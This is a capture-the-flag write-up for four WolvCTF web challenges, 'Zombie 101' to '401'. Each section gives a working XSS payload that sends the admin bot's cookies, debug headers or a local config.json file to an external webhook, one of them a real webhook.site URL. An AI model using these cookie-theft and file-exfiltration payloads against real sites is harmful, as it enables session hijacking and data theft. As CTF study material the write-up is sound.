---
title: WolvCTF - Writeup 
published: true
---

![](/assets/wolvctf/Overview.png)
# Challenges Solved : 
![](/assets/wolvctf/Challenges.png)

# Web 
## ZOmbie 101
This Challenge is a a classic xss where you steal the cookie's admin. (admin is a bot who visits the url you give).

![](/assets/wolvctf/Zombie101_Overview.png)

```
Payload : <script>window.location="https://<myWebHook>/?c=".concat(document.cookie)</script>
```
I sent the url with payload to the admin input and got the flag : ```wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} ``` 

## Zombie 201
It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can't gather the cookie throught the document object.
However, debug is activated allowing to perform request to /debug endpoint.

/debug's source code : 
```
// useful for debugging cloud deployments
app.get('/debug', function(req, res) {
    if (config.allowDebug) {
        res.send({"remote-ip": req.socket.remoteAddress, ...req.headers})
    }
    else {
        res.send('sorry, debug endpoint is not enabled')
    }
})

```
I thought I could exploit xss throught this endpoint :
```
payload : 
<script>
fetch("https://zombie-201-tlejfksioa-ul.a.run.app/debug")
  .then((response) => response.json())
  .then((data) => fetch("https://<MyHook>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
</script>
```
Flag : ```wctf{h1dd3n-c00k135-d1d-n07-h31p-373964} ``` 

## Zombie 301
In this challenge, httponly is still enabled, but debug is disabled. We can steal the admin cookie in HTTP headers by performing an HTTP request inside the website and resending the HTTP response to our webhook.
```
payload :  
<script>
fetch("https://zombie-301-tlejfksioa-ul.a.run.app/")
  .then((data) => fetch("https://webhook.site/4957c5a7-45dc-4660-9dec-8412969f79d2/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
</script>
```
Flag : ```wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831}```

## Zombie 401 
This time, httonly is disabled and debug is enabled, but the flag is in a file (config.json) hosted by the server. Our goal is to exfiltrate the file content to get the flag throught XSS. I used the "file ://" URI to exfiltrate the flag :
```
<script>
fetch('file:///ctf/app/config.json')
  .then(response => response.text())
  .then(data =>  window.location="https://<MyHook>/?/=".concat(data))
  .catch(error => window.location="https://<MyHook>/?/=".concat(error));
</script>
```
flag : ``` wctf{y0u-4r3-4n-4dm1n-807-m4573r-86835} Zombie 401``` 

# Forensic


# Beginner 